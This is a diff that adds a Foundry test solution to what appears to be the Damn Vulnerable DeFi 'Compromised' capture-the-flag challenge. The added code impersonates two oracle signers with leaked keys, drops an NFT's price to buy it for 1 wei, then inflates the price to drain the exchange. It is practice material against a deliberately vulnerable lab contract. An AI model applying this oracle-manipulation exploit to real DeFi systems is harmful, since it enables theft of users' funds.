@@ -73,13 +73,34 @@ contract Compromised is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        // Mocking the 2 private keys exposed in data leak
+        uint256 newPrice = 1;
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+        vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+        trustfulOracle.postPrice("DVNFT", newPrice);
 
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        newPrice = 9990 ether + 1 wei;
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+        vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        newPrice = 999 ether;
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+        vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+        trustfulOracle.postPrice("DVNFT", newPrice);
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
